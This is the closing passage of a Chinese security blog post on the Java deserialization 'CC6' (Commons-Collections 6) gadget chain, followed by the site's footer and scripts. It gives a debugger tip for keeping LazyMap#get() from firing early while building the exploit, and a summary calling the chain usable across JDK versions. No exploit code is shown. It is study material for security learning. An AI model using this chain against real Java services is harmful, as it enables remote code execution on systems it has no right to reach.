+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p><strong>调试器的这里关闭这两个选项，不然debug会自动执行一些方法，导致调试HashMap#put()的时候，</strong><br><strong>走到LazyMap#get()里，会自动给map添加key2，导致无论如何都过不了if，也调不了transform()</strong></p>
+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692075018562-55090e80-36e0-4455-991f-a4d1f6ea5c08.png" alt="image.png"></p>
+<img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1692075305204-48155661-53a8-4b26-be39-ab7964945097.png" alt="image.png" style="zoom:150%;" />
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CC6这条是不限制jdk版本的链子，比较通用，毕竟没有哪个版本会把HashMap给过滤了。<br>值得注意的是，CC6这条链给出了在Exp编写中，某个函数提前触发了链条的解决办法。<br>这条链本身并不难，主要是被IDEA的调试器给制裁了，导致调半天找不到出错原因。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">调用链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99Exp"><span class="toc-number">4.</span> <span class="toc-text">编写Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#lazyMap-get"><span class="toc-number">4.1.</span> <span class="toc-text">lazyMap#get()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-getvalue"><span class="toc-number">4.2.</span> <span class="toc-text">TiedMapEntry#getvalue()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-hashCode"><span class="toc-number">4.3.</span> <span class="toc-text">TiedMapEntry#hashCode()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-hash"><span class="toc-number">4.4.</span> <span class="toc-text">HashMap#hash()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-readObject"><span class="toc-number">4.5.</span> <span class="toc-text">HashMap#readObject()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88Exp"><span class="toc-number">4.6.</span> <span class="toc-text">最终Exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">5.</span> <span class="toc-text">注意事项</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/2328081059.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/2328081059.html&text=Java反序列化 CC6链"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/2328081059.html&is_video=false&description=Java反序列化 CC6链"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化 CC6链&body=Check out this article: https://jaspersec.top/posts/2328081059.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/2328081059.html&title=Java反序列化 CC6链"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/2328081059.html&name=Java反序列化 CC6链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/2328081059.html&t=Java反序列化 CC6链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    Jasper_sec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+      <ul>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">
+          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+          本站访客数 <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <span id="busuanzi_container_page_uv">
+          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
+        </span>
+      </ul>
+    </nav>
+  </div>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
